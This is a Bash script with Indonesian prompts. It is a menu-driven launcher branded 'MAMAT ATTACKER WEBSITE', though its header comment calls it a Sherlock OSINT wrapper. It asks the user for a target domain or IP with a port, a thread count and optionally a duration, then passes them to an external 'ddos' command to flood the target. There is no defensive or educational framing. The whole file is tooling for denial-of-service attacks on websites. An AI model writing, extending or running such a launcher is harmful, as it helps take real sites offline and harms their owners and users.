#!/bin/bash

# ================== CYBERPUNK HACKER THEME ==================
#   SHERLOCK WRAPPER - Mudah Digunakan
#   OSINT Username Finder
# ==
clear

# Colors (Cyberpunk Style)
NC='\e[0m'
RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
BLUE='\e[34m'
CYAN='\e[36m'
PURPLE='\e[35m'
L_GREEN='\e[92m'
L_CYAN='\e[96m'
L_RED='\e[91m'
GRAY='\e[90m'
BOLD='\e[1m'
BLINK='\e[5m'
hjutuabg="\033[42m"

function fn_ddos_thread() {
    clear
    echo -e "\033[1;32m========================================\033[0m"
    echo -e "\033[1;36m     MAMAT ATTACKER WEBSITE\033[0m"
    echo -e "\033[1;32m========================================\033[0m"

    echo -e "\n\033[1;33mMasukkan domain:port atau ip:port yang diserang:\033[0m"
    read -p "➤ " website

    if [ -z "$website" ]; then
        echo -e "\033[1;31mDomain:port atau Ip:port tidak boleh kosong!\033[0m"
        exit 1
    fi
    echo -e "\n\033[1;33mMasukkan jumlah thread:\033[0m"
    read -p "➤ " thread

   if [ -z "$thread" ]; then
        echo -e "\033[1;31mJumlah thread tidak boleh kosong!\033[0m"
        exit 1
    fi

    echo -e "\033[1;32m[+] Menjalankan Website Attacker...\033[0m"
    ddos -s "$website" -t $thread
}

function fn_ddos_thread_duration() {
    clear
    echo -e "\033[1;32m========================================\033[0m"
    echo -e "\033[1;36m     MAMAT ATTACKER WEBSITE\033[0m"
    echo -e "\033[1;32m========================================\033[0m"

    echo -e "\n\033[1;33mMasukkan domain:port atau ip:port yang diserang:\033[0m"
    read -p "➤ " website

    if [ -z "$website" ]; then
        echo -e "\033[1;31mDomain:port atau Ip:port tidak boleh kosong!\033[0m"
        exit 1
    fi

    echo -e "\n\033[1;33mMasukkan jumlah thread:\033[0m"
    read -p "➤ " thread

   if [ -z "$thread" ]; then
        echo -e "\033[1;31mJumlah thread tidak boleh kosong!\033[0m"
        exit 1
    fi

    echo -e "\n\033[1;33mMasukkan durasi serangan (detik):\033[0m"
    read -p "➤ " duration

    if [ -z "$duration" ]; then
        echo -e "\033[1;31mDurasi tidak boleh kosong!\033[0m"
        exit 1
    fi

    echo -e "\033[1;32m[+] Menjalankan Website Attacker...\033[0m"
    ddos -s "$website" -t $thread -d $duration
}

echo -e "${L_GREEN}"
cat << "EOF"
     _     _                   _   _             _    
  __| | __| | ___  ___    __ _| |_| |_ __ _  ___| | __
 / _` |/ _` |/ _ \/ __|  / _` | __| __/ _` |/ __| |/ /
| (_| | (_| | (_) \__ \ | (_| | |_| || (_| | (__|   < 
 \__,_|\__,_|\___/|___/  \__,_|\__|\__\__,_|\___|_|\_\

                 [ DDOS - ATTACK v1.0 ]
                 MAMAT ATTACKER WEBSITE
EOF
echo -e "${NC}"

echo -e "${GRAY}╔═══════════════════════════════════════════════╗${NC}"
echo -e "${GRAY}║${L_CYAN}          SYSTEM ACCESS TERMINAL v1.0          ${GRAY}║${NC}"
echo -e "${GRAY}╠═══════════════════════════════════════════════╣${NC}"
echo -e "${GRAY}║${L_GREEN} [${CYAN}1${L_GREEN}]${NC} ${YELLOW}Ddos Multi Thread${NC}                         ${GRAY}║${NC}"
echo -e "${GRAY}║${L_GREEN} [${CYAN}2${L_GREEN}]${NC} ${YELLOW}Ddos + Thread + Durasi${NC}                    ${GRAY}║${NC}"
#echo -e "${GRAY}║${L_GREEN} [${CYAN}3${L_GREEN}]${NC} ${YELLOW}Scan Site (No Save)${NC}                       ${GRAY}║${NC}"
echo -e "${GRAY}║${NC}                                               ${GRAY}║${NC}"
echo -e "${GRAY}║${L_GREEN} [${RED}0${L_GREEN}]${NC} ${RED}Kembali ke Menu Utama${NC}                     ${GRAY}║${NC}"
echo -e "${GRAY}╚═══════════════════════════════════════════════╝${NC}"
echo -e ""
echo -e "${L_CYAN}┌──(${L_RED}root${L_CYAN}@${YELLOW}mamat${L_CYAN})─[${L_GREEN}ddos-attacker${L_CYAN}]${NC}"
echo -e -n "${L_CYAN}└──▶️ ${NC}"
read -p "" plh
echo -e ""

case $plh in
1 | 01) fn_ddos_thread ;;
2 | 02) fn_ddos_thread_duration ;;
#3 | 03) fn_scan_site_no_txt ;;
#4 | 04) fn_scan_simpan ;;
0 | 00) clear ; newmenu ;;
x | X) clear ; echo -e "${L_RED}[!] DISCONNECTING FROM MATRIX...${NC}" ; exit 0 ;;
*) echo -e "${L_RED}[ERROR] Pilihan tidak valid.${NC}" ; sleep 2 ; clear ; m-ddos ;;
esac